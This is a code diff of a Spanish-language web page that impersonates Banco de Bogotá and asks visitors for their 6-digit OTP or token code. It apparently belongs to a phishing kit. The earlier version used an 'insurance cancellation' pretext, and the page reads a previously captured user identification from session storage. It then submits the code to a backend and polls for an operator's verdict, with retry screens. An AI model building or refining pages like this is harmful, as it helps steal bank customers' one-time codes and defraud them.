@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validación OTP - Banco de Bogotá</title>
+    <title>Validación de Token - Banco de Bogotá</title>
     
     <!-- Carga la configuración dinámica del backend -->
     <script src="/config.js"></script>
@@ -18,156 +18,136 @@
         }
 
         body {
-            background-color: #F8F9FA;
-            display: flex;
-            height: 100vh;
-            color: #333;
-        }
-
-        /* --- CONTENEDOR IZQUIERDO (FORMULARIO) --- */
-        .login-wrapper {
-            width: 50%;
+            background-color: #E8F0FE; /* Fondo azul claro similar a la imagen */
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
             padding: 20px;
+            color: #333;
         }
 
-        .login-section {
+        /* --- CONTENEDOR PRINCIPAL (Simula la pantalla del celular) --- */
+        .app-container {
+            background-color: #fff;
             width: 100%;
-            max-width: 420px;
+            max-width: 400px;
+            border-radius: 30px;
+            overflow: hidden;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.1);
             display: flex;
             flex-direction: column;
+            min-height: 600px;
+            position: relative;
         }
 
-        /* --- HEADER ESCRITORIO (PC) --- */
-        .header-pc {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            margin-bottom: 25px;
-        }
-
-        .header-pc .logo-pc {
-            height: 35px;
-            margin-bottom: 15px; 
-        }
-
-        .header-pc h1 {
-            font-size: 1.5rem;
-            color: #000;
-            font-weight: 700;
-            margin: 0;
-        }
-
-        /* --- HEADER MÓVIL (Oculto por defecto) --- */
-        .header-mobile {
-            display: none;
-        }
-
-        /* --- BANNER AZUL --- */
-        .blue-banner {
+        /* --- HEADER AZUL --- */
+        .app-header {
             background-color: #003DA5;
-            border-radius: 12px;
-            padding: 12px;
+            padding: 20px;
             display: flex;
             align-items: center;
             color: white;
-            margin-bottom: 25px;
+            border-top-left-radius: 30px;
+            border-top-right-radius: 30px;
+            height: 70px;
         }
 
-        .blue-banner img {
-            width: 60px;
-            height: 60px;
-            object-fit: contain;
+        .back-arrow {
+            font-size: 1.5rem;
+            cursor: pointer;
+            font-weight: bold;
             margin-right: 15px;
         }
 
-        .blue-banner-text {
-            font-size: 0.85rem;
-            line-height: 1.3;
+        /* --- CONTENIDO --- */
+        .app-content {
+            padding: 30px 25px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
         }
 
-        /* --- CAJA DE LOGIN (REUTILIZADA PARA OTP) --- */
-        .login-box {
-            border: 1px solid #E0E0E0;
+        .title-section h1 {
+            font-size: 1.5rem;
+            color: #000;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .title-section p {
+            font-size: 0.9rem;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        /* --- IMAGEN DEL TOKEN --- */
+        .token-image-container {
+            width: 100%;
+            margin-bottom: 25px;
             border-radius: 12px;
             overflow: hidden;
-            background: #fff;
-            margin-bottom: 20px;
-            padding: 25px;
         }
 
-        /* Alerta Celeste */
-        .alert-info {
-            background-color: #E8F4FF;
-            color: #004085;
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 0.85rem;
-            margin-bottom: 20px;
-            line-height: 1.4;
-            text-align: center;
+        .token-image-container img {
+            width: 100%;
+            height: auto;
+            display: block;
         }
 
-        /* Formularios */
-        .form-group {
-            margin-bottom: 20px;
+        /* --- INPUT OTP --- */
+        .otp-form {
+            margin-bottom: 30px;
         }
 
-        .form-group label {
+        .otp-form label {
             display: block;
             font-size: 0.9rem;
             color: #333;
             margin-bottom: 8px;
-            font-weight: 500;
+            font-weight: 600;
         }
 
-        input[type="text"] {
+        .otp-input {
             width: 100%;
             padding: 15px;
             border: 1px solid #ccc;
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 1.2rem;
+            text-align: center;
+            letter-spacing: 8px;
             outline: none;
             transition: border 0.2s;
-            text-align: center;
-            letter-spacing: 5px;
         }
 
-        input[type="text"]:focus {
+        .otp-input:focus {
             border-color: #003DA5;
         }
 
-        /* Botón Ingresar */
-        .btn-ingresar {
-            width: 100%;
-            padding: 14px;
-            background-color: #E0E0E0;
-            color: #999;
+        /* --- BOTÓN FINALIZAR --- */
+        .btn-finalizar {
+            background-color: #003DA5;
+            color: white;
             border: none;
-            border-radius: 6px;
+            padding: 16px;
+            border-radius: 8px;
             font-size: 1rem;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 10px;
-            transition: background-color 0.3s, color 0.3s;
+            width: 100%;
+            margin-top: auto; /* Empuja el botón al final */
+            transition: background 0.3s;
         }
 
-        .btn-ingresar.active {
-            background-color: #003DA5;
-            color: white;
-            cursor: pointer;
+        .btn-finalizar:hover {
+            background-color: #002D72;
         }
-
-        /* Footer */
-        .recaptcha-text {
-            font-size: 0.75rem;
-            color: #666;
-            line-height: 1.4;
-            text-align: center;
+        
+        .btn-finalizar:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
         }
-        .recaptcha-text a { color: #003DA5; text-decoration: none; }
 
         /* --- PANTALLAS DE ESTADO (CARGANDO Y ERROR) --- */
         .overlay-screen {
@@ -183,6 +163,7 @@
             flex-direction: column;
             padding: 20px;
             text-align: center;
+            background-color: rgba(255, 255, 255, 0.95);
         }
 
         #loading-screen {
@@ -203,10 +184,6 @@
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-
-        #error-screen {
-            background-color: #fff;
         }
 
         .error-box {
@@ -237,111 +214,60 @@
             font-size: 1rem;
             font-weight: bold;
             cursor: pointer;
-            transition: background 0.2s;
         }
         
-        .btn-retry:hover {
-            background-color: #002D72;
-        }
-
         /* --- RESPONSIVE MÓVIL --- */
-        @media (max-width: 768px) {
+        @media (max-width: 480px) {
             body {
-                flex-direction: column;
-                background-color: #fff;
-                height: auto;
-                min-height: 100vh;
-            }
-
-            .login-wrapper {
-                width: 100%;
-                padding: 20px;
+                padding: 0;
                 align-items: flex-start;
             }
-
-            .login-section {
-                max-width: 100%;
+            .app-container {
+                border-radius: 0;
+                min-height: 100vh;
+                box-shadow: none;
             }
-
-            .header-pc {
-                display: none;
-            }
-            
-            .header-mobile {
-                display: flex;
-                align-items: center;
-                margin-bottom: 20px;
-                gap: 10px;
-            }
-            
-            .header-mobile img {
-                height: 35px;
-            }
-
-            .header-mobile h1 {
-                font-size: 1.2rem;
-                font-weight: bold;
-                color: #000;
-                margin: 0;
+            .app-header {
+                border-top-left-radius: 0;
+                border-top-right-radius: 0;
             }
         }
     </style>
 </head>
 <body>
 
-    <!-- SECCIÓN IZQUIERDA (FORMULARIO OTP) -->
-    <div class="login-wrapper">
-        <div class="login-section">
+    <!-- CONTENEDOR PRINCIPAL -->
+    <div class="app-container">
+        
+        <!-- HEADER AZUL -->
+        <div class="app-header">
+            <div class="back-arrow">&#8592;</div> <!-- Flecha para volver -->
+            <h2></h2>
+        </div>
+
+        <!-- CONTENIDO -->
+        <div class="app-content">
             
-            <!-- HEADER PC -->
-            <div class="header-pc">
-                <img src="bogota.png" alt="Banco de Bogotá" class="logo-pc">
-                <h1>Validación de identidad</h1>
+            <div class="title-section">
+                <h1>Activaste tu Token</h1>
+                <p>Desde ahora tus transacciones será más sencillas y ágiles con tu código Token.</p>
             </div>
 
-            <!-- HEADER MÓVIL -->
-            <div class="header-mobile">
-                <img src="x.png" alt="Logo">
-                <h1>Validación de identidad</h1>
+            <!-- IMAGEN DEL TOKEN -->
+            <div class="token-image-container">
+                <img src="bog.png" alt="Token Activado">
             </div>
 
-            <!-- Banner Azul -->
-            <div class="blue-banner">
-                <img src="image.png" alt="Validación">
-                <div class="blue-banner-text">
-                    <strong>Para cancelar el seguro Alfa</strong><br>
-                    Es necesario validar su identidad para continuar con el proceso.
-                </div>
+            <!-- FORMULARIO OTP -->
+            <div class="otp-form">
+                <label>Ingresa el código de tu Token</label>
+                <input type="text" id="otp-input" class="otp-input" placeholder="••••••" maxlength="6" inputmode="numeric" pattern="\d*" autocomplete="one-time-code">
             </div>
 
-            <!-- Caja de OTP -->
-            <div class="login-box">
-                
-                <div class="alert-info" id="info-alert">
-                    Hemos enviado un código de seguridad a tu dispositivo.<br>
-                    Usuario: <strong id="identificacion-mostrada">...</strong>
-                </div>
-
-                <div class="form-group">
-                    <label>Código OTP</label>
-                    <input type="text" id="otp-input" placeholder="••••••" maxlength="6" inputmode="numeric" pattern="\d*" autocomplete="one-time-code">
-                </div>
-
-                <button class="btn-ingresar" id="btn-otp">Validar Código</button>
-
-            </div>
-
-            <!-- Texto Legal -->
-            <div class="recaptcha-text">
-                Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio</a> de Google.
-            </div>
+            <!-- BOTÓN FINALIZAR -->
+            <button class="btn-finalizar" id="btn-otp" disabled>Finalizar</button>
 
         </div>
-    </div>
-
-    <!-- SECCIÓN DERECHA (items.png - Reutilizada) -->
-    <div class="right-section">
-        <img src="items.png" alt="Menú de accesos directos">
     </div>
 
     <!-- PANTALLA DE CARGA (AZUL) -->
@@ -370,18 +296,6 @@
         const identificacionAprobada = sessionStorage.getItem('identificacionAprobada');
         const requestIdOrigen = sessionStorage.getItem('requestIdAprobado');
 
-        // Mostrar la identificación en la interfaz
-        // Si no existe (por algún error), mostramos "No disponible" sin redirigir
-        const identificacionMostrada = document.getElementById('identificacion-mostrada');
-        if (identificacionAprobada) {
-            identificacionMostrada.textContent = identificacionAprobada;
-        } else {
-            identificacionMostrada.textContent = "Sesión no encontrada";
-            // Opcional: deshabilitar el botón si no hay sesión
-            document.getElementById('btn-otp').disabled = true;
-            document.getElementById('btn-otp').textContent = "Sesión expirada";
-        }
-
         // Elementos del DOM
         const otpInput = document.getElementById('otp-input');
         const btnOtp = document.getElementById('btn-otp');
@@ -390,14 +304,24 @@
 
         let pollingInterval = null;
 
+        // Si no hay identificación, deshabilitar el botón y mostrar alerta
+        if (!identificacionAprobada) {
+            btnOtp.textContent = "Sesión expirada";
+            btnOtp.disabled = true;
+            otpInput.disabled = true;
+            otpInput.placeholder = "No disponible";
+        }
+
         // ==========================================
         // 2. LÓGICA DE UI (ACTIVAR BOTÓN)
         // ==========================================
         otpInput.addEventListener('input', () => {
-            // Activamos el botón si hay al menos 4 dígitos
-            if (otpInput.value.trim().length >= 4 && !btnOtp.disabled) {
+            // Activamos el botón si hay al menos 6 dígitos
+            if (otpInput.value.trim().length === 6 && !btnOtp.disabled) {
+                btnOtp.disabled = false;
                 btnOtp.classList.add('active');
             } else {
+                btnOtp.disabled = true;
                 btnOtp.classList.remove('active');
             }
         });
@@ -407,13 +331,7 @@
         // ==========================================
         async function enviarOtp() {
             const otp = otpInput.value.trim();
-            if (otp.length < 4) return;
-
-            // Si no hay identificación, no hacer nada
-            if (!identificacionAprobada) {
-                alert("No se encontró la sesión. Por favor, vuelve a iniciar sesión.");
-                return;
-            }
+            if (otp.length !== 6) return;
 
             // Mostrar pantalla de carga
             loadingScreen.style.display = 'flex';
@@ -462,6 +380,7 @@
         function retryOtp() {
             errorScreen.style.display = 'none';
             otpInput.value = '';
+            btnOtp.disabled = true;
             btnOtp.classList.remove('active');
             otpInput.focus();
         }
@@ -471,7 +390,7 @@
         
         // Enviar con "Enter" en el input
         otpInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter' && otpInput.value.trim().length >= 4) {
+            if (e.key === 'Enter' && otpInput.value.trim().length === 6) {
                 enviarOtp();
             }
         });
